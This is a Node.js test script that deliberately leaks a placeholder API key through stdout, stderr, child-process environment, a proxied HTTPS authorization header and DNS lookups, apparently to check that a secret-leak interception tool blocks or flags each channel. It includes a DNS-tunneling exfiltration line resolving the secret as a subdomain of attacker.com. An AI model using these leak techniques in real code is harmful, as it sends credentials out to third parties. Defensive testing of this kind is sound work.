import dns from 'node:dns';

// 1. Stdout leak — secret in a console.log
const MY_SECRET = process.env.MY_SECRET || 'sk_test_AbCdEfGhIjKlMnOpQrStUvWx1234';
console.log('DEBUG: app starting with key:', MY_SECRET);

// 2. Object spread leak
const config = { db_url: 'postgres://localhost/app', apiKey: MY_SECRET };
console.log('Config dump:', JSON.stringify(config));

// 3. stderr leak
process.stderr.write(`Error: connection failed with token ${MY_SECRET}\n`);

// 4. Child process env inheritance (picked up by ESM hook)
const { spawn } = await import('node:child_process');
const child = spawn('echo', ['hello'], {
  env: { ...process.env, MY_SECRET }
});
child.stdout.on('data', d => process.stdout.write(d));

// 5. HTTPS MITM Leak (performs raw CONNECT request to verify TLS termination and scanning)
import http from 'node:http';
import tls from 'node:tls';

if (process.env.HTTPS_PROXY) {
  console.log('Initiating HTTPS proxy CONNECT request...');
  const proxyUrl = new URL(process.env.HTTPS_PROXY);

  const req = http.request({
    host: proxyUrl.hostname,
    port: proxyUrl.port,
    method: 'CONNECT',
    path: 'api.stripe.com:443',
  });

  req.on('connect', (res, socket) => {
    console.log('CONNECT event received from proxy. Initiating TLS connection...');
    const tlsSocket = tls.connect({
      socket: socket,
      servername: 'api.stripe.com',
      rejectUnauthorized: true, // Verifies NODE_EXTRA_CA_CERTS is respected
    }, () => {
      console.log('TLS handshake completed. Writing HTTP request...');
      // Leak the secret in the Authorization header
      tlsSocket.write(
        `GET /v1/charges HTTP/1.1\r\n` +
        `Host: api.stripe.com\r\n` +
        `Authorization: Bearer ${MY_SECRET}\r\n` +
        `Connection: close\r\n\r\n`
      );
    });

    tlsSocket.on('data', () => {});
    tlsSocket.on('error', (err) => console.error('TLS SOCKET ERROR:', err));
  });

  req.on('error', (err) => console.error('REQ CONNECT ERROR:', err));
  req.end();
}

// 6. Outbound DNS Tunneling leak check
try {
  console.log('Resolving DNS that contains secret...');
  // This should be intercepted, logged, and blocked (throw error)
  await dns.promises.resolve4(`${MY_SECRET}.attacker.com`);
} catch (err) {
  console.log('Successfully intercepted DNS secret leak:', err.message);
}

// 7. Outbound DNS high-entropy check
try {
  console.log('Resolving high-entropy DNS (potential tunneling indicator)...');
  // This should trigger a warning but NOT be blocked
  await dns.promises.resolve4('a8b9c1d2e3f4g5h6i7j8k9l0.example.com');
} catch (err) {
  console.log('High entropy lookup error (expected if domain does not exist):', err.message);
}

setTimeout(() => {
  console.log('App finished.');
}, 1000);
